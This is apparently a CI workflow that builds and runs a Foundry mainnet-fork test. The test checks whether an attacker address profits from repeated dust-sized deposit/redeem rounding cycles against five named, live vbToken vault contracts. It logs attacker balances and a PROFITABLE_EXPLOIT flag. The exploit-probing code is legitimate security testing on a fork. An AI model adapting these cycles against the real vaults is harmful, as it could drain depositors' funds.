name: Katana yield-vault rounding ratchet exact-fork gate

on:
  pull_request:
    branches: [main]
    paths:
      - '.github/workflows/katana-yield-rounding-ratchet-fork-20260729.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  gate:
    runs-on: ubuntu-24.04
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
          fetch-depth: 1

      - uses: foundry-rs/foundry-toolchain@v1
        with:
          version: stable

      - name: Build standalone fork test
        shell: bash
        run: |
          set -euo pipefail
          rm -rf rounding-gate
          mkdir -p rounding-gate/test
          cd rounding-gate
          forge install foundry-rs/forge-std@v1.9.4 --no-git --shallow
          cat > foundry.toml <<'EOF'
          [profile.default]
          test = "test"
          libs = ["lib"]
          solc_version = "0.8.29"
          evm_version = "cancun"
          optimizer = true
          optimizer_runs = 833
          gas_limit = 1000000000
          EOF
          cat > test/RoundingRatchet.t.sol <<'SOL'
          // SPDX-License-Identifier: MIT
          pragma solidity 0.8.29;

          import {Test, console2} from "forge-std/Test.sol";

          interface IERC20Like {
              function balanceOf(address) external view returns (uint256);
              function approve(address,uint256) external returns (bool);
              function decimals() external view returns (uint8);
          }

          interface IERC4626Like {
              function balanceOf(address) external view returns (uint256);
              function deposit(uint256,address) external returns (uint256);
              function redeem(uint256,address,address) external returns (uint256);
              function convertToAssets(uint256) external view returns (uint256);
              function totalAssets() external view returns (uint256);
              function totalSupply() external view returns (uint256);
          }

          interface IVbTokenLike {
              function asset() external view returns (address);
              function yieldVault() external view returns (address);
              function deposit(uint256,address) external returns (uint256);
              function redeem(uint256,address,address) external returns (uint256);
              function totalAssets() external view returns (uint256);
              function totalSupply() external view returns (uint256);
              function backingDifference() external view returns (bool,uint256);
          }

          contract RoundingRatchet is Test {
              address constant ATTACKER = address(0xA7711A);

              address constant VB_USDC = 0x53E82ABbb12638F09d9e624578ccB666217a765e;
              address constant VB_ETH  = 0x2DC70fb75b88d2eB4715bc06E1595E6D97c34DFF;
              address constant VB_WBTC = 0x2C24B57e2CCd1f273045Af6A5f632504C432374F;
              address constant VB_USDT = 0x6d4f9f9f8f0155509ecd6Ac6c544fF27999845CC;
              address constant VB_USDS = 0x3DD459dE96F9C28e3a343b831cbDC2B93c8C4855;

              function setUp() public {
                  vm.createSelectFork(vm.envString("ETH_RPC_URL"));
              }

              function test_OneHundredDustRoundTrips_AllTokens() public {
                  _cycle("vbUSDC", VB_USDC, 2, 100);
                  _cycle("vbETH",  VB_ETH,  2, 100);
                  _cycle("vbWBTC", VB_WBTC, 2, 100);
                  _cycle("vbUSDT", VB_USDT, 2, 100);
                  _cycle("vbUSDS", VB_USDS, 2, 100);
              }

              function test_VbUSDSAmountMatrix() public {
                  uint256[10] memory amounts = [uint256(1),2,3,10,99,100,101,1e6,1e12,1e18];
                  for (uint256 i; i < amounts.length; ++i) {
                      uint256 snapshot = vm.snapshotState();
                      _cycle("vbUSDS_MATRIX", VB_USDS, amounts[i], 1);
                      vm.revertToState(snapshot);
                  }
              }

              function test_VbUSDSDominantExternalShareholderCannotProfit() public {
                  IVbTokenLike vb = IVbTokenLike(VB_USDS);
                  IERC20Like asset = IERC20Like(vb.asset());
                  IERC4626Like externalVault = IERC4626Like(vb.yieldVault());

                  uint256 initialCapital = 2_000e18;
                  deal(address(asset), ATTACKER, initialCapital, true);
                  vm.startPrank(ATTACKER);
                  asset.approve(address(externalVault), type(uint256).max);
                  uint256 directShares = externalVault.deposit(1_000e18, ATTACKER);
                  asset.approve(address(vb), type(uint256).max);
                  uint256 afterDirectDeposit = asset.balanceOf(ATTACKER);
                  (bool beforePositive, uint256 beforeDifference) = vb.backingDifference();
                  uint256 vbVaultSharesBefore = externalVault.balanceOf(address(vb));

                  uint256 successfulCycles;
                  for (uint256 i; i < 100; ++i) {
                      try vb.deposit(2, ATTACKER) returns (uint256 minted) {
                          try vb.redeem(minted, ATTACKER, ATTACKER) returns (uint256) {
                              successfulCycles++;
                          } catch { break; }
                      } catch { break; }
                  }
                  externalVault.redeem(directShares, ATTACKER, ATTACKER);
                  vm.stopPrank();

                  uint256 finalCapital = asset.balanceOf(ATTACKER);
                  (bool afterPositive, uint256 afterDifference) = vb.backingDifference();
                  uint256 vbVaultSharesAfter = externalVault.balanceOf(address(vb));
                  console2.log("SCENARIO", "VBUSDS_DOMINANT_EXTERNAL_SHAREHOLDER");
                  console2.log("SUCCESSFUL_CYCLES", successfulCycles);
                  console2.log("ATTACKER_INITIAL", initialCapital);
                  console2.log("ATTACKER_AFTER_DIRECT_DEPOSIT", afterDirectDeposit);
                  console2.log("ATTACKER_FINAL", finalCapital);
                  console2.log("ATTACKER_PROFIT", finalCapital > initialCapital ? finalCapital - initialCapital : 0);
                  console2.log("ATTACKER_LOSS", initialCapital > finalCapital ? initialCapital - finalCapital : 0);
                  console2.log("BACKING_BEFORE_POSITIVE", beforePositive ? uint256(1) : uint256(0));
                  console2.log("BACKING_BEFORE_DIFFERENCE", beforeDifference);
                  console2.log("BACKING_AFTER_POSITIVE", afterPositive ? uint256(1) : uint256(0));
                  console2.log("BACKING_AFTER_DIFFERENCE", afterDifference);
                  console2.log("VBTOKEN_EXTERNAL_SHARES_BEFORE", vbVaultSharesBefore);
                  console2.log("VBTOKEN_EXTERNAL_SHARES_AFTER", vbVaultSharesAfter);
                  console2.log("PROFITABLE_EXPLOIT", finalCapital > initialCapital ? uint256(1) : uint256(0));
              }

              function _cycle(string memory label, address vbAddress, uint256 amount, uint256 requestedCycles) internal {
                  IVbTokenLike vb = IVbTokenLike(vbAddress);
                  IERC20Like asset = IERC20Like(vb.asset());
                  IERC4626Like externalVault = IERC4626Like(vb.yieldVault());
                  uint256 required = amount * requestedCycles + amount;
                  uint256 originalAttacker = asset.balanceOf(ATTACKER);
                  deal(address(asset), ATTACKER, originalAttacker + required, true);
                  uint256 initial = asset.balanceOf(ATTACKER);
                  uint256 vbAssetsBefore = vb.totalAssets();
                  uint256 vbSupplyBefore = vb.totalSupply();
                  uint256 extSharesBefore = externalVault.balanceOf(vbAddress);
                  uint256 extAssetsBefore = externalVault.convertToAssets(extSharesBefore);
                  (bool backingBeforePositive, uint256 backingBeforeDifference) = vb.backingDifference();

                  vm.startPrank(ATTACKER);
                  asset.approve(vbAddress, type(uint256).max);
                  uint256 completed;
                  for (uint256 i; i < requestedCycles; ++i) {
                      try vb.deposit(amount, ATTACKER) returns (uint256 minted) {
                          try vb.redeem(minted, ATTACKER, ATTACKER) returns (uint256) {
                              completed++;
                          } catch { break; }
                      } catch { break; }
                  }
                  vm.stopPrank();

                  uint256 finalBalance = asset.balanceOf(ATTACKER);
                  uint256 vbAssetsAfter = vb.totalAssets();
                  uint256 vbSupplyAfter = vb.totalSupply();
                  uint256 extSharesAfter = externalVault.balanceOf(vbAddress);
                  uint256 extAssetsAfter = externalVault.convertToAssets(extSharesAfter);
                  (bool backingAfterPositive, uint256 backingAfterDifference) = vb.backingDifference();

                  console2.log("TOKEN", label);
                  console2.log("AMOUNT", amount);
                  console2.log("REQUESTED_CYCLES", requestedCycles);
                  console2.log("COMPLETED_CYCLES", completed);
                  console2.log("ATTACKER_INITIAL", initial);
                  console2.log("ATTACKER_FINAL", finalBalance);
                  console2.log("ATTACKER_PROFIT", finalBalance > initial ? finalBalance - initial : 0);
                  console2.log("ATTACKER_LOSS", initial > finalBalance ? initial - finalBalance : 0);
                  console2.log("VB_ASSETS_BEFORE", vbAssetsBefore);
                  console2.log("VB_ASSETS_AFTER", vbAssetsAfter);
                  console2.log("VB_SUPPLY_BEFORE", vbSupplyBefore);
                  console2.log("VB_SUPPLY_AFTER", vbSupplyAfter);
                  console2.log("EXTERNAL_SHARES_BEFORE", extSharesBefore);
                  console2.log("EXTERNAL_SHARES_AFTER", extSharesAfter);
                  console2.log("EXTERNAL_ASSETS_BEFORE", extAssetsBefore);
                  console2.log("EXTERNAL_ASSETS_AFTER", extAssetsAfter);
                  console2.log("BACKING_BEFORE_POSITIVE", backingBeforePositive ? uint256(1) : uint256(0));
                  console2.log("BACKING_BEFORE_DIFFERENCE", backingBeforeDifference);
                  console2.log("BACKING_AFTER_POSITIVE", backingAfterPositive ? uint256(1) : uint256(0));
                  console2.log("BACKING_AFTER_DIFFERENCE", backingAfterDifference);
                  console2.log("PROFITABLE_EXPLOIT", finalBalance > initial ? uint256(1) : uint256(0));
              }
          }
          SOL

      - name: Run exact Ethereum fork matrix
        shell: bash
        env:
          ETH_RPC_URL: https://ethereum-rpc.publicnode.com
        run: |
          set -o pipefail
          mkdir -p evidence
          cd rounding-gate
          forge test -vvvv 2>&1 | tee ../evidence/FOUNDRY.log
          status=${PIPESTATUS[0]}
          cd ..
          grep -E 'SCENARIO|TOKEN|AMOUNT|CYCLES|ATTACKER_(INITIAL|FINAL|PROFIT|LOSS)|VB_(ASSETS|SUPPLY)|EXTERNAL_(SHARES|ASSETS)|BACKING_(BEFORE|AFTER)|PROFITABLE_EXPLOIT|Suite result' evidence/FOUNDRY.log > evidence/SUMMARY.txt || true
          printf '%s\n' "$status" > evidence/FORGE_EXIT_CODE.txt
          sha256sum evidence/FOUNDRY.log evidence/SUMMARY.txt evidence/FORGE_EXIT_CODE.txt > evidence/SHA256SUMS
          cat evidence/SUMMARY.txt
          exit "$status"

      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: katana-yield-rounding-ratchet-${{ github.run_id }}
          path: evidence/
          if-no-files-found: warn
          retention-days: 1
          compression-level: 9
